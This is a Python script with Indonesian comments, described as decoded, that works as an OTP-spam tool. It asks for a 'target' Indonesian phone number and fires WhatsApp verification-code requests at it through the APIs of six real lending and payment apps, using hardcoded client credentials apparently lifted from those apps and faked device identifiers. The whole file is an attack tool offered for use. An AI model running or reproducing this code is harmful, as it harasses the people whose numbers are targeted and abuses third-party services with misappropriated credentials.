#Sabtu - 1 - November - 2025
#Decode By Andrax Dev
#anjay manual njir :v
#Tools Decode By Andrax C2

import requests
import json
import random
import string
import time
import os
import signal
import sys
a = '\x1b[1;30m'
m = '\x1b[1;31m'
p = '\x1b[1;37m'
h = '\x1b[1;32m'
r = '\x1b[0m'


def clear():
    os.system('clear')


def signal_handler(sig, frame):
    input(
        f'\n {a}[{m}!{a}] {p}Kamu Sengaja Keluar Paksa Dari Program {a}| \x1b[101m{h} ENTER {r}'
        )
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTSTP, signal_handler)


def color(text, color_code='red'):
    colors = {'red': '\x1b[1;31m', 'green': '\x1b[1;32m', 'reset': '\x1b[0m'}
    return f"{colors.get(color_code, '')}{text}{colors['reset']}"


def codex(length=8):
    return ''.join(random.choice(string.ascii_letters + string.digits) for
        _ in range(length))


def send_adiraku(nomor):
    url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
    payload = {'mobileNumber': nomor, 'type': 'prospect-create', 'channel':
        'whatsapp'}
    try:
        res = requests.post(url, json=payload, timeout=10)
        result = json.loads(res.text).get('message', '')
        if result == 'success':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP Adiraku Error{m} :{a}', e)


def send_singa(nomor):
    url = (
        'https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id='
        )
    payload = {'mobile_phone': nomor, 'type': 'mobile', 'is_switchable': 1}
    headers = {'Content-Type': 'application/json; charset=utf-8'}
    try:
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        result = json.loads(res.text).get('msg', '')
        if result == 'Success':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP Singa Error{m} :{a}', e)


def send_speedcash(nomor):
    url_token = 'https://sofia.bmsecure.id/central-api/oauth/token'
    headers_token = {'Authorization':
        'Basic NGFiYmZkNWQtZGNkYS00OTZlLWJiNjEtYWMzNzc1MTdjMGJmOjNjNjZmNTZiLWQwYWItNDlmMC04NTc1LTY1Njg1NjAyZTI5Yg=='
        , 'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        res_token = requests.post(url_token, data=
            'grant_type=client_credentials', headers=headers_token, timeout=10)
        auth = json.loads(res_token.text).get('access_token', '')
        if not auth:
            print(f' {a}[{m}!{a}]{p} Gagal Mendapatkan Token SpeedCash')
            return
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP SpeedCash Error{m} :{a}', e)
        return
    url_otp = 'https://sofia.bmsecure.id/central-api/sc-api/otp/generate'
    payload_otp = {'version_name': '6.2.1 (428)', 'phone': nomor, 'appid':
        'SPEEDCASH', 'version_code': 428, 'location': '0,0', 'state':
        'REGISTER', 'type': 'WA', 'app_id': 'SPEEDCASH', 'uuid': 
        '00000000-4c22-250d-ffff-ffff' + codex(8), 'via': 'BB ANDROID'}
    headers_otp = {'Authorization': f'Bearer {auth}', 'Content-Type':
        'application/json'}
    try:
        res_otp = requests.post(url_otp, json=payload_otp, headers=
            headers_otp, timeout=10)
        result = json.loads(res_otp.text).get('rc', '')
        if result == '00':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP SpeedCash Error{m} :{a}', e)


def otp_bisatopup(nomor):
    url = (
        f'https://api-mobile.bisatopup.co.id/register/send-verification?type=WA&device_id={codex(16)}&version_name=6.12.04&version=61204'
        )
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'phone_number': nomor}
    try:
        response = requests.post(url, headers=headers, data=data, timeout=10)
        try:
            result = response.json().get('message', '')
        except:
            result = response.text
        if result == 'OTP akan segera dikirim ke perangkat':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP BisaTopUp Error{m} :{a}', e)


def jogjakita(nomor):
    try:
        url_token = 'https://aci-user.bmsecure.id/oauth/token'
        payload_token = (
            'grant_type=client_credentials&uuid=00000000-0000-0000-0000-000000000000&id_user=0&id_kota=0&location=0.0%2C0.0&via=jogjakita_user&version_code=501&version_name=6.10.1'
            )
        headers_token = {'authorization':
            'Basic OGVjMzFmODctOTYxYS00NTFmLThhOTUtNTBlMjJlZGQ2NTUyOjdlM2Y1YTdlLTViODYtNGUxNy04ODA0LWQ3NzgyNjRhZWEyZQ=='
            , 'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'okhttp/4.10.0'}
        r1 = requests.post(url_token, data=payload_token, headers=
            headers_token, timeout=10)
        r1.raise_for_status()
        data1 = r1.json()
        auth = data1.get('access_token')
        if not auth:
            print(f' {a}[{m}!{a}]{p} Gagal ambil access_token')
            return
        url_otp = 'https://aci-user.bmsecure.id/v2/user/signin-otp/wa/send'
        payload_otp = {'phone_user': nomor, 'primary_credential': {
            'device_id': '', 'fcm_token': '', 'id_kota': 0, 'id_user': 0,
            'location': '0.0,0.0', 'uuid': '', 'version_code': '501',
            'version_name': '6.10.1', 'via': 'jogjakita_user'}, 'uuid':
            '00000000-4c22-250d-3006-9a465f072739', 'version_code': '501',
            'version_name': '6.10.1', 'via': 'jogjakita_user'}
        headers_otp = {'Content-Type': 'application/json; charset=UTF-8',
            'Authorization': f'Bearer {auth}'}
        r2 = requests.post(url_otp, json=payload_otp, headers=headers_otp,
            timeout=10)
        r2.raise_for_status()
        data2 = r2.json()
        if str(data2.get('rc')) == '200':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP JogjaKita Error{m} :{a}', e)


def cairin(nomor):
    url = 'https://app.cairin.id/v2/app/sms/sendWhatAPPOPT'
    data = {'appVersion': '3.0.4', 'phone': nomor, 'userImei': codex(32)}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        response = requests.post(url, data=data, headers=headers, timeout=10)
        if response.text.strip() == '{"code":"0"}':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP Cairin Error{m} :{a}', e)


def adiraku(nomor):
    url = 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata'
    payload = {'mobileNumber': nomor, 'type': 'prospect-create', 'channel':
        'whatsapp'}
    headers = {'Content-Type': 'application/json; charset=utf-8',
        'User-Agent': 'okhttp/4.9.0'}
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=10)
        r.raise_for_status()
        response = r.json()
        if response.get('message') == 'success':
            print(f' {a}[{m}+{a}]{p} Berhasil Mengirim OTP Ke{a} {nomor}')
        else:
            print(f' {a}[{m}!{a}]{p} Gagal Mengirim OTP Ke {a}{nomor}')
    except Exception as e:
        print(f' {a}[{m}!{a}]{p} OTP ADIRAKU V2 Error{m} :{a}', e)
        print()


def open_yt():
    clear()
    input(
        f'{a}[\x1b[101m{h} SUPPORT {r}{a}]{p} Please Subscribe My YouTube{a} | \x1b[101m{h} ENTER {r}'
        )
    time.sleep(2)
    url = 'https://youtube.com/@byexeofficial'
    if 'termux' in os.getenv('PREFIX', '').lower():
        os.system(f"termux-open-url '{url}'")
    elif platform.system() == 'Linux':
        os.system(f"xdg-open '{url}'")
    elif platform.system() == 'Windows':
        os.system(f'start {url}')
    elif platform.system() == 'Darwin':
        os.system(f'open {url}')
    else:
        import webbrowser
        webbrowser.open(url)


def banner_spam_otp_only():
    os.system('clear')
    print(
        f"""{m}
╭─────────────────────────────────────────────────────────╮
{m}│ ⠀{a}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀{a}⠀⠀⠀⠀⠀⠀⠀⢀⣼⣷⣀⠀⠀⣠⣾⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀{a}⠀⠀⠀⠀⢀⣴⣿⣿⠟⠁⣠⣾⣿⡿⠻⣿⣿⣷⣄⠀⠀  {a}[ {m}> {p}SCRIPT INI 100% FREE {m}< {a}] {m}│
{m}│ ⠀⠀⠀{a}⠀⠀⠀⢀⣴⣿⣿⠟⠁⣠⣾⣿⡿⠋⠀⠀⡈⠻⣿⣿⣷⣄⠀⠀⠀⠀⠀  {h}•{p} Author {m}: {p}Byexe {h}•⠀⠀⠀⠀⠀ {m}│
{m}│ ⠀⠀{a}⠀⠀⢀⣴⣿⣿⠟⠁⣠⣾⣿⡿⠋⠀⠀⢠⣾⣿⣦⡈⠻⣿⣿⣦⡄⠀⠀⠀⠀⠀⠀                       {m}│
{m}│ {a}⠀⠀⢀⣴⣿⣿⡟⠃⣠⣾⣿⡿⠋⠀⠀⠀⠀⠀⠙⠛⠛⠛⠆⠈⠛⠛⠛⠣⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│{a} ⢀⣴⣿⣿⡟⠃⢠⣾⣿⡿⠋⠀⢀⣤⣶⣶⣦⣄⠀⠀⣤⣤⣤⣤⣤⣤⡄⠀⠀⢠⣤⣤⣤⣤⣄⡀                    {m}│
{m}│{a} ⠙⢿⣿⣿⣦⡀⠀⠙⠋⠀⠀⢰⣿⠋⠁⠀⠈⢻⣷⠀⠈⠉⢹⣿⠉⠉⠁⠀⠀⢸⣿⠉⠉⠉⢻⣷                    {m}│
{m}│ {a}⠀⠀⠙⢿⣿⣿⣆⡀⠀⠀⠀⣿⡇⠀⠀⠀⠀⢀⣿⠆⠀⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⣤⣤⣤⣾⡟                    {m}│
{m}│ {a}⠀⠀⣴⡀⠙⢿⣿⣷⣆⠀⠀⠸⣿⣦⣀⣀⣠⣾⡿⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⠉⠉⠉⠁⠀                    {m}│
{m}│{a} ⠀⠺⣿⣿⣦⡀⠙⢿⣿⣷⣄⠀⠈⠙⠛⠛⠛⠉⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀{a}⠀⠈⠻⣿⣿⣦⡀⠙⢿⣿⣷⣄⠀⠀⠀⠀⠀⣠⣦⣴⣶⠄⢀⣴⣴⣶⡔⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀{a}⠀⠈⠻⣿⣿⣦⡀⠙⢿⣿⠛⠀⠀⣠⣾⣿⣿⠟⢁⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀⠀{a}⠀⠈⠻⣿⣿⣦⡀⠁⠀⣠⣾⣿⣿⠟⢁⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                     {m}│
{m}│ ⠀⠀⠀⠀⠀⠀⠀{a}⠀⠈⠻⣿⣿⣦⣾⣿⣿⠟⢁⣴⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀⠀⠀⠀⠀⠀{a}⠀⠈⠻⣿⣿⠟⠁⠀⠈⠻⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                    {m}│
{m}│ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀{a}⠀⠈⠁⠀                                         {m}│
╰─────────────────────────────────────────────────────────╯

 {a}[[101m{h} INFO {r}{a}]{p} Masukkan Nomor Telepon Target Dengan Awalan 08×××
 {a}[[101m{h} INFO {r}{a}]{p} Script Ini Hanya Work Pada Target Nomor Indonesia
"""
        )


def nomor_otp():
    while True:
        banner_spam_otp_only()
        try:
            nomor = input(
                f' {a}[{m}?{a}] {p}Masukkan Nomor Telepon Target {m}:{a} ')
            print()
            if nomor.startswith('08') and nomor.isdigit():
                return nomor
            else:
                input(
                    f"""
 {a}[{m}!{a}] {p}Format Nomor Telepon Tidak Valid {a}| [101m{h} ENTER {r}"""
                    )
        except (EOFError, KeyboardInterrupt):
            input(
                f"""
 {a}[{m}!{a}] {p}Kamu Sengaja Keluar Paksa Dari Program {a}| [101m{h} ENTER {r}"""
                )
            sys.exit(0)


def anjing():
    try:
        banner_spam_otp_only()
        nomor = nomor_otp()
        adiraku(nomor)
        send_singa(nomor)
        send_speedcash(nomor)
        otp_bisatopup(nomor)
        jogjakita(nomor)
        cairin(nomor)
        input(
            f'\n {a}[{m}i{a}] {p}Sukses Mengirim OTP {a}| \x1b[101m{h} ENTER {r}'
            )
        return
    except (EOFError, KeyboardInterrupt):
        input(
            f"""
 {a}[{m}!{a}] {p}Kamu Sengaja Keluar Paksa Dari Program {a}| [101m{h} ENTER {r}"""
            )
        sys.exit(0)


if __name__ == '__main__':
    try:
        clear()
        print(
            f'{a}[\x1b[101m{h} INFO {r}{a}]{p} Script Sedang Dijalankan{m},{p} Harap Tunggu {a}1{m}-{a}2{p} Menit'
            )
        time.sleep(30)
        open_yt()
        time.sleep(3)
        anjing()
    except (EOFError, KeyboardInterrupt):
        input(
            f"""
 {a}[{m}!{a}] {p}Kamu Sengaja Keluar Paksa Dari Program {a}| [101m{h} ENTER {r}"""
            )
        sys.exit(0)